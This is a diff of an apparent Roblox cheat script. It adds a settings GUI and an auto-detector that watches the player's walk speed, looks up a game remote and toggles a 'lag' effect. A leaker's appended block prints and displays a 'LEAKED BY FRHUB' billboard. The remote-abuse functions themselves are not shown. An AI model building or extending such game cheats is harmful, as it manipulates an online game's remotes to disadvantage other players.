+        b.BackgroundColor3 = mode == config.mode and C.red or C.card
+        b.TextColor3 = mode == config.mode and C.white or C.dim
+    end
+    strengthValue.Text = strengthName(config.power) .. "  >"
+    for i, choice in ipairs(strengthChoices) do
+        choice.BackgroundColor3 = config.power == STRENGTH_PRESETS[i].power and C.darkRed or C.card
+    end
+    delayBox.Text = tostring(config.interval)
+    kbButton.Text = listening == "keyboard" and "Press key..." or config.keyboard
+    gpButton.Text = listening == "controller" and "Press button..." or config.controller
+    tween(autoToggle, {BackgroundColor3 = config.autoBrainrot and C.red or C.card})
+    tween(knob, {Position = UDim2.fromOffset(config.autoBrainrot and 21 or 3, 3)})
+    tween(fpsToggle, {BackgroundColor3 = config.fpsBoost and C.red or C.card})
+    tween(fpsKnob, {Position = UDim2.fromOffset(config.fpsBoost and 21 or 3, 3)})
+    tween(ultraToggle, {BackgroundColor3 = config.ultraAntiLag and C.red or C.card})
+    tween(ultraKnob, {Position = UDim2.fromOffset(config.ultraAntiLag and 21 or 3, 3)})
+    opacityLabel.Text = "BACKGROUND VISIBILITY  " .. config.opacity .. "%"
+    sliderFill.Size = UDim2.fromScale(config.opacity / 100, 1)
+    transparencyLabel.Text = "GUI TRANSPARENCY  " .. config.guiTransparency .. "%"
+    transparencyFill.Size = UDim2.fromScale(config.guiTransparency / 90, 1)
+    applyVisibility()
+    for i, entry in ipairs(previews) do entry.outline.Transparency = i == config.background and 0 or 1 end
+    renderActivation()
+end
+local function showTab(name)
+    strengthPicker.Visible = false
+    appearance.Visible = name == "style"
+    controls.Visible = name == "tune"
+    binds.Visible = name == "binds"
+    controlsTab.BackgroundColor3 = name == "tune" and C.darkRed or C.card
+    bindsTab.BackgroundColor3 = name == "binds" and C.darkRed or C.card
+    styleTab.BackgroundColor3 = name == "style" and C.darkRed or C.card
+    listening, resetArmed = nil, false
+    reset.Text = "Reset defaults"
+    refresh()
+end
+local function closeSettings()
+    strengthPicker.Visible = false
+    settings.Visible = false
+    listening, resetArmed = nil, false
+    reset.Text = "Reset defaults"
+    refresh()
+end
+connect(controlsTab.Activated, function() showTab("tune") end)
+connect(bindsTab.Activated, function() showTab("binds") end)
+connect(styleTab.Activated, function() showTab("style") end)
+connect(cfgButton.Activated, function()
+    if settings.Visible then closeSettings() else settings.Visible = true; refresh() end
+end)
+connect(close.Activated, closeSettings)
+for mode, b in pairs(modeButtons) do
+    local selectedMode = mode
+    connect(b.Activated, function()
+        selectPowerMode(selectedMode)
+        save()
+        refresh()
+    end)
+end
+connect(strengthButton.Activated, function()
+    listening = nil
+    refresh()
+    strengthPicker.Visible = true
+end)
+connect(pickerClose.Activated, function() strengthPicker.Visible = false end)
+for i, choice in ipairs(strengthChoices) do
+    local preset = STRENGTH_PRESETS[i]
+    connect(choice.Activated, function()
+        setModePower(preset.power)
+        strengthPicker.Visible = false
+        save()
+        refresh()
+    end)
+end
+connect(activate.Activated, function() flipLag(not active, true) end)
+connect(autoToggle.Activated, function()
+    config.autoBrainrot = not config.autoBrainrot
+    brainrotMode, manualOverride, lastBrainrotState = false, false, false
+    if not config.autoBrainrot then flipLag(false) end
+    save()
+    refresh()
+end)
+connect(fpsToggle.Activated, function()
+    config.fpsBoost = not config.fpsBoost
+    graphics.set(config.fpsBoost, config.ultraAntiLag)
+    save()
+    refresh()
+end)
+connect(ultraToggle.Activated, function()
+    config.ultraAntiLag = not config.ultraAntiLag
+    graphics.set(config.fpsBoost, config.ultraAntiLag)
+    save()
+    refresh()
+end)
+connect(kbButton.Activated, function() listening = "keyboard"; refresh() end)
+connect(gpButton.Activated, function() listening = "controller"; refresh() end)
+connect(kbClear.Activated, function() config.keyboard = "None"; listening = nil; save(); refresh() end)
+connect(gpClear.Activated, function() config.controller = "None"; listening = nil; save(); refresh() end)
+local function changeGUISize(value)
+    config.guiSize = normalizeGUISize(value) or config.guiSize
+    save()
+    refresh()
+end
+connect(guiSizeBox.FocusLost, function() changeGUISize(guiSizeBox.Text) end)
+connect(sizeLess.Activated, function() changeGUISize(config.guiSize - 5) end)
+connect(sizeMore.Activated, function() changeGUISize(config.guiSize + 5) end)
+connect(less.Activated, function() config.opacity = math.max(0, config.opacity - 5); save(); refresh() end)
+connect(more.Activated, function() config.opacity = math.min(100, config.opacity + 5); save(); refresh() end)
+connect(transparencyLess.Activated, function()
+    config.guiTransparency = math.max(0, config.guiTransparency - 5)
+    save()
+    refresh()
+end)
+connect(transparencyMore.Activated, function()
+    config.guiTransparency = math.min(90, config.guiTransparency + 5)
+    save()
+    refresh()
+end)
+local function bindSlider(track, field, maximum)
+    local dragging, touch
+    local function slideAt(x)
+        local width = track.AbsoluteSize.X
+        if width <= 0 then return end
+        local fraction = math.clamp((x - track.AbsolutePosition.X) / width, 0, 1)
+        config[field] = math.floor(fraction * maximum + 0.5)
+        refresh()
+    end
+    connect(track.InputBegan, function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            touch = input.UserInputType == Enum.UserInputType.Touch and input or nil
+            slideAt(input.Position.X)
+        end
+    end)
+    connect(UIS.InputChanged, function(input)
+        if dragging and (input == touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
+            slideAt(input.Position.X)
+        end
+    end)
+    connect(UIS.InputEnded, function(input)
+        if dragging and (input == touch or input.UserInputType == Enum.UserInputType.MouseButton1) then
+            dragging = false
+            save()
+        end
+    end)
+end
+bindSlider(slider, "opacity", 100)
+bindSlider(transparencySlider, "guiTransparency", 90)
+connect(reset.Activated, function()
+    if not resetArmed then resetArmed = true; reset.Text = "Confirm reset"; return end
+    for k, v in pairs(defaults) do config[k] = copyDefault(v) end
+    strengthPicker.Visible = false
+    graphics.set(false, false)
+    flipLag(false)
+    brainrotMode, manualOverride, lastBrainrotState = false, false, false
+    listening, resetArmed = nil, false
+    reset.Text = "Reset defaults"
+    save()
+    refresh()
+end)
+
+local function updateDetection()
+    if not config.autoBrainrot then
+        brainrotMode, manualOverride, lastBrainrotState = false, false, false
+        detectorLabel.Text = "AUTO OFF  /  MANUAL"
+        return
+    end
+    local character = player.Character
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+    if not humanoid then
+        if lastBrainrotState then
+            brainrotMode, manualOverride, lastBrainrotState = false, false, false
+            flipLag(false)
+        end
+        detectorLabel.Text = "AUTO / WAITING"
+        return
+    end
+    local hasBrainrot = humanoid.WalkSpeed < 25
+    if hasBrainrot ~= lastBrainrotState then
+        lastBrainrotState = hasBrainrot
+        brainrotMode = hasBrainrot
+        manualOverride = false
+        if hasBrainrot and not remote then remote = findRemote() end
+        flipLag(hasBrainrot)
+    elseif hasBrainrot and brainrotMode and not active and not manualOverride then
+        if not remote then remote = findRemote() end
+        if remote then flipLag(true) end
+    end
+    if hasBrainrot then
+        detectorLabel.Text = remote and "AUTO / DETECTED" or "AUTO / NO REMOTE"
+    else
+        detectorLabel.Text = "AUTO / MONITORING"
+    end
+end
+local function setVisible(visible)
+    main.Visible = visible
+    reopen.Visible = not visible
+    if not visible then closeSettings() end
+end
+connect(reopen.Activated, function() setVisible(true) end)
+connect(UIS.InputBegan, function(input, processed)
+    if UIS:GetFocusedTextBox() then return end
+    local key = input.KeyCode
+    local kb = input.UserInputType == Enum.UserInputType.Keyboard
+    local gp = input.UserInputType.Name:sub(1, 7) == "Gamepad"
+    if strengthPicker.Visible then
+        if key == Enum.KeyCode.Escape or (gp and key == Enum.KeyCode.ButtonB) then
+            strengthPicker.Visible = false
+        elseif key == Enum.KeyCode.LeftControl then
+            setVisible(not main.Visible)
+        end
+        return
+    end
+    if listening then
+        if key == Enum.KeyCode.Escape then listening = nil; refresh(); return end
+        if listening == "keyboard" and kb and key ~= Enum.KeyCode.Unknown and key ~= Enum.KeyCode.LeftControl then
+            config.keyboard = key.Name
+        elseif listening == "controller" and gp and isGamepad(key) then config.controller = key.Name
+        else return end
+        listening = nil
+        save()
+        refresh()
+        return
+    end
+    if processed then return end
+    if key == Enum.KeyCode.LeftControl then setVisible(not main.Visible); return end
+    if (kb and key == keycode(config.keyboard)) or (gp and key == keycode(config.controller)) then
+        flipLag(not active, true)
+    end
+end)
+
+local dragFrame, dragStart, dragPosition, dragTouch
+local function draggable(header, frame)
+    connect(header.InputBegan, function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragFrame, dragStart, dragPosition = frame, input.Position, frame.Position
+            dragTouch = input.UserInputType == Enum.UserInputType.Touch and input or nil
+        end
+    end)
+end
+draggable(mainHeader, main)
+draggable(settingsHeader, settings)
+connect(UIS.InputEnded, function(input)
+    if input == dragTouch or input.UserInputType == Enum.UserInputType.MouseButton1 then dragFrame = nil end
+end)
+connect(UIS.InputChanged, function(input)
+    if not dragFrame then return end
+    if input.UserInputType ~= Enum.UserInputType.MouseMovement and input ~= dragTouch then return end
+    local delta = input.Position - dragStart
+    dragFrame.Position = UDim2.new(dragPosition.X.Scale, dragPosition.X.Offset + delta.X,
+        dragPosition.Y.Scale, dragPosition.Y.Offset + delta.Y)
+    clampFrame(dragFrame)
+end)
+connect(screen:GetPropertyChangedSignal("AbsoluteSize"), function() clampFrame(main); clampFrame(settings) end)
+local animationElapsed, rotation = 0, 0
+connect(RunService.RenderStepped, function(dt)
+    if not screen.Enabled or (not main.Visible and not settings.Visible) then return end
+    animationElapsed = animationElapsed + dt
+    if animationElapsed < (UIS.TouchEnabled and 1 / 24 or 1 / 30) then return end
+    rotation = (rotation + animationElapsed * 18) % 360
+    animationElapsed = 0
+    for i = #movingGradients, 1, -1 do
+        local gradient = movingGradients[i]
+        if gradient.Parent then gradient.Rotation = rotation else table.remove(movingGradients, i) end
+    end
+end)
+local elapsed = 0
+connect(RunService.Heartbeat, function(dt)
+    elapsed = elapsed + dt
+    if elapsed >= 0.1 then elapsed = 0; updateDetection() end
+end)
+showTab("tune")
+task.defer(function()
+    if screen.Parent then
+        remote = findRemote()
+        clampFrame(main)
+        clampFrame(settings)
+        graphics.set(config.fpsBoost, config.ultraAntiLag)
+    end
+end)
+print("LEAKED BY FRHUB")
+print("LEAKED BY FRHUB")
+print("LEAKED BY FRHUB")
+print("LEAKED BY FRHUB")
+print("LEAKED BY FRHUB")
+print("LEAKED BY FRHUB")
+print("LEAKED BY FRHUB")
+print("LEAKED BY FRHUB")
+print("LEAKED BY FRHUB")
+print("LEAKED BY FRHUB")
+task.spawn(function()
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+
+local Player = Players.LocalPlayer
+local BillboardName = "FRHUB_LEAKED_BILLBOARD"
+
+local function CreateBillboard(Character)
+    local Head = Character:WaitForChild("Head", 10)
+    if not Head then return end
+
+    local Old = CoreGui:FindFirstChild(BillboardName)
+    if Old then
+        Old:Destroy()
+    end
+
+    local Billboard = Instance.new("BillboardGui")
+    Billboard.Name = BillboardName
+    Billboard.Adornee = Head
+    Billboard.Size = UDim2.new(0, 220, 0, 45)
+    Billboard.StudsOffset = Vector3.new(0, 2.8, 0)
+    Billboard.AlwaysOnTop = true
+    Billboard.LightInfluence = 0
+    Billboard.MaxDistance = 10000
+    Billboard.Parent = CoreGui
+
+    local Text = Instance.new("TextLabel")
+    Text.Size = UDim2.new(1, 0, 1, 0)
+    Text.BackgroundTransparency = 1
+    Text.Text = "LEAKED BY FRHUB"
+    Text.TextColor3 = Color3.fromRGB(255, 0, 0)
+    Text.TextSize = 22
+    Text.Font = Enum.Font.GothamBold
+    Text.TextStrokeColor3 = Color3.fromRGB(80, 0, 0)
+    Text.TextStrokeTransparency = 0
+    Text.Parent = Billboard
+end
+
+Player.CharacterAdded:Connect(function(Character)
+    CreateBillboard(Character)
+end)
+
+if Player.Character then
+    task.spawn(CreateBillboard, Player.Character)
+end
+
+task.spawn(function()
+    while task.wait(1) do
+        local Character = Player.Character
+        if Character then
+            local Head = Character:FindFirstChild("Head")
+            local Billboard = CoreGui:FindFirstChild(BillboardName)
+
+            if Head and (not Billboard or Billboard.Adornee ~= Head) then
+                CreateBillboard(Character)
+            end
+        end
+    end
+end)
+end)
